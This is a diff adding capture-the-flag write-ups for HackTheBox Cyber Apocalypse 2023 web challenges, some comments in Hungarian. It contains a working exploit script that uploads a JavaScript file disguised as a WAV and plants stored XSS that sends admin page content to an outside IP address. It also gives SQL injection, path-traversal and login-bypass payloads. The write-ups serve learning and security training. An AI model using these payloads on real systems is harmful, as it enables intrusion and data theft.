@@ -1,6 +1,68 @@
 # HTB-CA23
 HackTheBox CyberApocalypse 2k23 writeups (Rowra)
 
+## Web/Spybug
+* after registering an agent, you can update its details, which is then reflected on the admin site. `XSS` works!
+* the page implements `script-src: self` so we can't use `RFI` or even `inline` scripts. That scripts needs to be local!
+* we can upload `wav` files which after being uploaded end up in the `/uploads` directory, with a `uuid` name and no extension. No extension can indeed be loaded as working `js`
+* the upload process has some validators but they're all easily cheated: the original extension is irrelevant for our payload and the latter check only validates if the proper wave file magic bytes are present in the file, however, it doesn't need to begin with those to pass the test!
+* summarizing the steps are:
+1. register an agent
+2. craft & upload a malicious javascript-wave file 
+3. update the agent's details to implement the XSS, using the previously uploaded javascript file - which is local by now
+4. wait for the callback and receive the flag
+
+Due to the sheer complexity of this challenge I programmed it:
+```
+import requests 
+import sys 
+ 
+base = 'http://127.0.0.1:1337' 
+base = f'http://{sys.argv[1]}' 
+s = requests.Session() 
+ 
+def agent_register(): 
+    url = f'{base}/agents/register' 
+    r = s.get(url) 
+    return r.json() 
+ 
+def agent_upload(agent, payload): 
+    url = f'{base}/agents/upload/{agent["identifier"]}/{agent["token"]}' 
+    mfd = {'recording': ('test.wav', payload, 'audio/wave')} 
+ 
+    r = s.post(url, files=mfd) 
+    if r.status_code == 200: 
+        return r.text 
+    raise Exception('ERROR failed to upload') 
+ 
+def agent_update(agent, data): 
+    url = f'{base}/agents/details/{agent["identifier"]}/{agent["token"]}' 
+    r = s.post(url, json=data) 
+    return 'SUCCESS' if r.status_code == 200 else 'ERROR' 
+ 
+# step 1 agent regisztráció 
+agent = agent_register() 
+ 
+# step 2 malicious wav - javascript feltöltés 
+payload = b''' 
+window.location = 'http://84.236.80.251:4444/' + document.getElementsByTagName("h2")[0].innerText.split("Welcome back ")[1]; 
+''' # a lényeg 
+payload += b'\n/*' # új sor + egy komment kezdet, biztos ami biztos 
+payload += b'\x52\x49\x46\x46\x2f\x2a\x16\x00\x57\x41\x56\x45' # WAVE magicbyte és/vagy ami kell a backendnek 
+payload += b'*/' # van egy `/*` karakter a WAVE magic byte -ban, amire sír a JS, szóval le kell zárni :D 
+ 
+filename = agent_upload(agent, payload) 
+print(f'Got filename {filename}') 
+ 
+ 
+# step 3 XSS az admin panelre ;] 
+data = {'hostname': f'<script src="/uploads/{filename}"></script>', 
+        'platform': 'pwnd by', 
+        'arch': 'RWR'} 
+ 
+print(agent_update(agent, data))
+ 
+```
 
 ## Web/Didactic Octo Paddle
 * in `middleware/AdminMiddleware.js` you can notice the `else` clause in which `jwt.verify` func. call's 2nd parameter is `null`. This means there's not crypt involved. This obviously means very easily crafted JWTs
@@ -57,4 +119,12 @@ if __name__ == '__main__':
 * in the source code you can see the `js` included `/static/js/script.js`
 * `script.js` has a function called `checkPin` which checks if entered ping is equal to `CONFIG.correctPin`
 * just enter `CONFIG.correctPin` in the browser console and get the correct code `7298`
+
+## Web/Orbital
+* in `database.py` you can see that it ojnly queries the user and checks the password later on, trying to prevent sqli. It didnt really work as expected, it's just as vulnerable just maybe a little more difficult. Working payload with `union injection`: `admin" union select "rowra","bb84c3e15018b35b6994f3ad7cb1c453" order by username desc-- -` _(is the username)_ and gecosz is the password
+* payload for the `/api/export` endpoint is a simple `LFI`: `{"name": "../signal_sleuth_firmware"}`
+
+## Web/Drobots
+* `database.py` hints it's going to be sqli and it's pretty visible too
+* login as username `admin` password: `1" or "1"="1"-- -`
 
